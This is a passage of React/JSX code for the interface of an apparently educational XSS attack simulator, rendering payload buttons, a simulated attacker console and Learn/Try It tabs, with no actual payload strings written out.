          Pre-built Payloads -- {sandboxTab === 'reflected' ? 'Reflected' : sandboxTab === 'stored' ? 'Stored' : 'DOM-based'} XSS
        </h4>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          {currentPayloads.map((p, i) => (
            <button
              key={i}
              onClick={() => handlePayloadClick(p.payload)}
              className="text-left p-2.5 rounded-lg bg-gray-50 dark:bg-gray-800 hover:bg-purple-50 dark:hover:bg-purple-900/20 border border-gray-200 dark:border-gray-700 transition-colors group"
            >
              <div className="flex items-center justify-between mb-1">
                <span className="text-xs font-semibold text-gray-700 dark:text-gray-300 group-hover:text-purple-700 dark:group-hover:text-purple-300 transition-colors">{p.label}</span>
                <Copy className="w-3 h-3 text-gray-400 opacity-0 group-hover:opacity-100 transition-opacity" />
              </div>
              <code className="text-[10px] font-mono text-purple-600 dark:text-purple-400 block break-all leading-relaxed">{p.payload}</code>
              <p className="text-[10px] text-gray-400 mt-1">{p.desc}</p>
            </button>
          ))}
        </div>
      </div>

      {/* Attacker Console */}
      <div className="bg-gray-950 rounded-xl border border-gray-700 overflow-hidden">
        <div className="flex items-center justify-between px-3 py-2 bg-gray-900 border-b border-gray-700">
          <h4 className="text-xs font-semibold text-gray-400 flex items-center gap-1.5">
            <Terminal className="w-3.5 h-3.5" /> Attacker Console Output
          </h4>
          <button onClick={clearConsole} className="text-[10px] text-gray-500 hover:text-gray-300 transition-colors">Clear</button>
        </div>
        <div className="p-3 max-h-48 overflow-y-auto space-y-1 min-h-[60px]">
          {consoleEntries.length === 0 ? (
            <p className="text-[11px] text-gray-600 italic">Submit a payload to see what an attacker could capture...</p>
          ) : (
            consoleEntries.map(entry => (
              <div key={entry.id} className="flex items-start gap-2 text-[11px] font-mono">
                <span className="text-gray-600 shrink-0">[{entry.timestamp}]</span>
                <span className={
                  entry.type === 'stolen' ? 'text-red-400 font-bold'
                  : entry.type === 'warning' ? 'text-yellow-400'
                  : entry.type === 'blocked' ? 'text-green-400'
                  : 'text-blue-400'
                }>
                  {entry.message}
                </span>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );

  // ─── Main Render ────────────────────────────────────────────────────────

  return (
    <div className="h-full flex flex-col bg-gradient-to-br from-slate-50 to-purple-50 dark:from-gray-950 dark:to-purple-950/30 p-3 overflow-hidden">
      {/* Header */}
      <div className="flex items-center justify-between mb-3 shrink-0">
        <h2 className="text-sm font-bold text-gray-900 dark:text-gray-100">XSS Attack Simulator</h2>
      </div>

      {/* Main Tabs: Learn / Sandbox */}
      <div className="flex gap-1 mb-3 shrink-0 bg-gray-100 dark:bg-gray-800 rounded-lg p-0.5">
        <button
          onClick={() => setMainTab('learn')}
          className={`flex-1 px-4 py-2 text-xs rounded-md font-semibold transition-colors flex items-center justify-center gap-1.5 ${
            mainTab === 'learn'
              ? 'bg-white dark:bg-gray-700 text-gray-900 dark:text-gray-100 shadow-sm'
              : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'
          }`}
        >
          <BookOpen className="w-3.5 h-3.5" /> Learn
        </button>
        <button
          onClick={() => setMainTab('sandbox')}
          className={`flex-1 px-4 py-2 text-xs rounded-md font-semibold transition-colors flex items-center justify-center gap-1.5 ${
            mainTab === 'sandbox'
              ? 'bg-white dark:bg-gray-700 text-gray-900 dark:text-gray-100 shadow-sm'
              : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'
          }`}
        >
          <Play className="w-3.5 h-3.5" /> Try It
        </button>
      </div>

      {/* Content Area */}
      <div className="flex-1 min-h-0 overflow-auto">
        {mainTab === 'learn' ? (
          <div className="flex gap-3 h-full">
            {/* Sidebar Navigation */}
            <div className="w-40 shrink-0 space-y-0.5">
              {LEARN_SECTIONS.map(sec => (
                <button
                  key={sec.key}
                  onClick={() => setLearnSection(sec.key)}
                  className={`w-full text-left px-3 py-2 text-xs rounded-lg font-medium transition-colors ${
                    learnSection === sec.key
                      ? 'bg-purple-100 dark:bg-purple-900/30 text-purple-700 dark:text-purple-300 border border-purple-200 dark:border-purple-800/50'
                      : 'text-gray-600 dark:text-gray-400 hover:bg-gray-100 dark:hover:bg-gray-800 hover:text-gray-900 dark:hover:text-gray-200'
                  }`}
                >
                  {sec.label}
                </button>
              ))}
            </div>

            {/* Learn Content */}
            <div className="flex-1 min-w-0 overflow-auto">
              {renderLearnContent()}
            </div>
          </div>
        ) : (
          renderSandboxContent()
        )}
      </div>
    </div>
  );
};
